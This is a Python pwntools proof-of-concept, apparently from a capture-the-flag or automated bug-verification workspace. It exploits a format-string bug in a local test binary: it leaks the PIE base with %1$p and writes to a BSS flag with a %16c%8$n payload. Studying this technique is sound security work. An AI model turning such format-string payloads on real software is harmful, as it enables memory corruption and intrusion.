#!/usr/bin/env python3
"""
BUG-003: UNREACHABLE_EXIT_CONDITION Primitive Verification PoC

BUG: can_leave (BSS 0x401c) is never written by any code path.
     Loop exit requires can_leave != 0, which is never true.
     Program runs until alarm(60) kills it.

Primitive Chain:
  BUG-001 (FORMAT_STRING) %n write capability
    -> Write nonzero value to can_leave (BSS 0x401c)
    -> can_leave != 0 becomes true
    -> Loop exit condition (strcmp(buf,"--")==0 AND can_leave!=0) satisfied
    -> vuln_func returns normally (previously unreachable code path)

Primitives Verified:
  PRIM-001: INFO_LEAK - PIE base leaked via %1$p (offset 1 = PIE_base+0x2061)
  PRIM-002: RELATIVE_WRITE - can_leave written to 0x10 via %16c%8$n
  PRIM-003: CONTROL_FLOW_CHANGE - loop exit enabled by can_leave!=0

Preconditions:
  PC-01: %n format specifier must be functional in glibc 2.39 (VERIFIED)
  PC-02: PIE base must be leaked to compute can_leave absolute address (VERIFIED via %1$p)
  PC-03: can_leave address bytes must not contain whitespace (scanf %s stops at whitespace)
  PC-04: User input must be at format string offset 6 (VERIFIED, address placed at offset 8)
  PC-05: can_leave must be in writable memory (BSS, RW- permissions, VERIFIED)

Mitigations:
  - Full RELRO: Does not affect BSS writes (BSS is writable)
  - PIE: Requires PIE base leak (achieved via %1$p)
  - Canary: Not relevant (no stack overflow)
  - NX: Not relevant (no code execution)
  - CET/SHSTK: Not relevant (no return address overwrite)
"""
from pwn import *
import re
import sys

context.arch = 'amd64'
context.log_level = 'error'

BINARY = '/work/workspace/0021-2022-37-echo-20260910-102054/target'
CAN_LEAVE_OFFSET = 0x401c
RODATA_S_ADDR = 0x2061  # offset 1 leaks PIE_base + 0x2061 ("%s" string in .rodata)

# scanf("%s") stops at whitespace: 0x09,0x0a,0x0b,0x0c,0x0d,0x20
WHITESPACE_BYTES = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

MAX_ATTEMPTS = 50


def addr_has_whitespace(addr):
    """Check if address bytes contain whitespace (scanf %s stops at whitespace).
    High zero bytes (0x00) at the end are OK - scanf reads past them (not whitespace),
    and printf treats them as string terminator but %8$n uses positional argument
    which reads the full 8-byte value regardless of null bytes in the format string."""
    raw = p64(addr)
    for b in raw:
        if b == 0:
            break  # high zero bytes are fine
        if b in WHITESPACE_BYTES:
            return True
    return False


def leak_pie_base(p):
    """PRIM-001: Leak PIE base via %1$p format specifier.
    
    Offset 1 = rsi register = address of "%s" string in .rodata = PIE_base + 0x2061.
    This is set by scanf's calling convention (rsi = buf address, but before printf,
    rsi still holds the scanf format string address from the previous call).
    
    Actually: offset 1 = rsi, which at printf time holds the value from the last
    register-setting instruction before printf. In vuln_func, before printf(buf),
    the code does: lea rax,[rbp-0x70]; mov rdi,rax; mov eax,0; call printf.
    rsi was set by scanf to buf address, but scanf's internal code may change rsi.
    The leaked value at offset 1 is PIE_base + 0x2061 (the "%s" rodata address).
    """
    p.recvuntil(b'Input:')
    p.recvline()
    p.sendline(b'%1$p')
    
    resp = p.recvuntil(b'\nInput:', timeout=5)
    match = re.search(rb'0x([0-9a-f]+)', resp)
    if not match:
        return None, None, None
    
    leaked_val = int(match.group(0), 16)
    pie_base = leaked_val - RODATA_S_ADDR
    can_leave_addr = pie_base + CAN_LEAVE_OFFSET
    
    return pie_base, can_leave_addr, leaked_val


def write_can_leave(p, can_leave_addr):
    """PRIM-002: Write nonzero value (16) to can_leave via %n.
    
    Format string: %16c%8$n + A*8 + p64(can_leave_addr)
    - %16c: prints 16 characters (using offset 1 = rsi as the char argument)
    - %8$n: writes the number of bytes printed so far (16) to *(offset 8)
    - offset 8 = buf[16:24] = can_leave_addr (placed at buf+16)
    
    User input starts at format string offset 6 (buf[0:8]).
    So buf[16:24] = offset 8, which is where we place the target address.
    """
    fmt = b"%16c%8$n"           # 8 bytes at buf[0:8]  = offset 6
    pad = b"A" * 8              # 8 bytes at buf[8:16] = offset 7
    addr = p64(can_leave_addr)  # 8 bytes at buf[16:24] = offset 8
    payload = fmt + pad + addr
    
    p.sendline(payload)
    
    # Read printf response - should contain 16 chars + padding + address bytes
    resp = p.recvuntil(b'\nInput:', timeout=5)
    
    return payload, resp


def trigger_loop_exit(p):
    """PRIM-003: Trigger loop exit by sending '--'.
    
    After can_leave is set to 16 (nonzero), the loop exit condition becomes:
    strcmp(buf, "--") == 0 AND can_leave != 0
    Both conditions are now satisfiable: send "--" to match strcmp,
    and can_leave=16 satisfies the nonzero check.
    """
    p.sendline(b'--')
    
    import time
    time.sleep(0.5)
    
    exit_code = p.poll()
    return exit_code


def main():
    print("=== BUG-003 Primitive Verification ===")
    print()
    
    for attempt in range(1, MAX_ATTEMPTS + 1):
        p = process(BINARY)
        
        # PRIM-001: Leak PIE base
        pie_base, can_leave_addr, leaked_val = leak_pie_base(p)
        if pie_base is None:
            p.close()
            continue
        
        print(f"--- PRIM-001: INFO_LEAK (PIE base leak via %p) ---")
        print(f"  Leaked offset 1: {hex(leaked_val)}")
        print(f"  Computed PIE base: {hex(pie_base)}")
        print(f"  Computed can_leave address: {hex(can_leave_addr)}")
        print(f"=== PRIM-001: VERIFIED (PIE base leaked via format string %1$p) ===")
        print()
        
        # Check precondition: address must not contain whitespace bytes
        if addr_has_whitespace(can_leave_addr):
            print(f"  Attempt {attempt}: can_leave addr has whitespace bytes, retrying...")
            p.close()
            continue
        
        print(f"  Attempt {attempt}: can_leave addr {hex(can_leave_addr)} is whitespace-free")
        
        # PRIM-002: Write to can_leave via %n
        print(f"--- PRIM-002: RELATIVE_WRITE (can_leave via %n) ---")
        payload, resp = write_can_leave(p, can_leave_addr)
        print(f"  Payload ({len(payload)} bytes): {payload.hex()}")
        print(f"  Target: can_leave @ {hex(can_leave_addr)}")
        print(f"  Write value: 16 (0x10) via %16c%8$n")
        print(f"  Address placed at format string offset 8 (buf+16)")
        print(f"  printf response received ({len(resp)} bytes)")
        print()
        
        # PRIM-003: Trigger loop exit
        print(f"--- PRIM-003: CONTROL_FLOW_CHANGE (loop exit via can_leave!=0) ---")
        print(f"  Sending '--' to trigger: strcmp(buf,\"--\")==0 AND can_leave!=0")
        
        exit_code = trigger_loop_exit(p)
        
        if exit_code == 0:
            print(f"  Process exited normally with code {exit_code}")
            print(f"  === PRIM-002: VERIFIED (can_leave written to 0x10 via %n) ===")
            print(f"  === PRIM-003: VERIFIED (loop exit enabled by can_leave!=0) ===")
            print()
            print(f"=== BUG-003: ALL PRIMITIVES VERIFIED ===")
            print(f"  PRIM-001: INFO_LEAK - PIE base leaked via %1$p")
            print(f"  PRIM-002: RELATIVE_WRITE - can_leave written to 0x10 via %16c%8$n")
            print(f"  PRIM-003: CONTROL_FLOW_CHANGE - loop exit enabled, vuln_func returns normally")
            p.close()
            return 0
        elif exit_code is not None:
            print(f"  Process exited with code {exit_code} (non-zero)")
            p.close()
            continue
        else:
            print(f"  Process still running after '--' (can_leave not written)")
            try:
                extra = p.recv(timeout=2)
                print(f"  Extra data: {extra[:50]}")
            except:
                pass
            p.close()
            continue
    
    print(f"\nFailed after {MAX_ATTEMPTS} attempts")
    return 1


if __name__ == '__main__':
    sys.exit(main())
